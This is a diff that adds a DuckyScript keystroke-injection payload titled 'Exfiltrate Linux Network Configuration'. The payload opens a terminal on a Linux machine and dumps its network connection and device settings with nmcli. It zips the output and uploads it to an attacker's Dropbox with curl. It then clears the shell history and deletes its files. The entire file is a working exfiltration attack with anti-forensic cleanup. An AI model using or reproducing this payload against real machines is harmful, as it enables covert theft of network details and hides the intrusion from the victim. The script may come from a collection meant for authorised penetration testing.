@@ -1,0 +1,58 @@
+REM ##########################################################
+REM #                                                        |
+REM # Title        : Exfiltrate Linux Network Configuration  |
+REM # Author       : Aleff                                   |
+REM # Version      : 1.0                                     |
+REM # Category     : Exfiltration                            |
+REM # Target       : Linux                                   |
+REM #                                                        |
+REM ##########################################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Dropbox Account
+REM     - - DROPBOX_ACCESS_TOKEN
+
+DEFINE #TOKEN example
+DEFINE #DROPBOX_FOLDER_NAME example
+DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+
+
+DEFAULT_DELAY 500
+CTRL ALT t
+
+DELAY 2000
+REM Required: Set here your Dropbox access TOKEN
+STRINGLN ACCESS_TOKEN="#TOKEN"
+
+REM STRING USER_NAME=$(whoami)
+REM ENTER
+
+STRINGLN RANDOM=$(shuf -i 1-999999999999 -n 1)
+
+STRINGLN ZIP_NAME="$RANDOM.zip"
+STRINGLN ZIP_PATH="/home/$USER_NAME/Documents/$ZIP_NAME"
+
+REM Folder path
+STRINGLN TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/Documents" prefix-XXXXXXXXXX)
+
+STRINGLN nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
+
+STRINGLN nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
+
+STRINGLN nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"
+
+REM Delay for zipping operation, it depends by computer power and folder directory
+STRINGLN zip -r "$ZIP_PATH" "$TMP_FOLDER_PATH"
+DELAY 3000
+
+REM Set yout Dropbox folder name
+STRINGLN DROPBOX_FOLDER="/#DROPBOX_FOLDER_NAME"
+
+STRINGLN curl -X POST #DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
+
+DELAY 2000
+STRINGLN history -c
+STRINGLN rm -rf "$TMP_FOLDER_PATH"
+STRINGLN rm -rf "$ZIP_PATH"
+STRINGLN exit
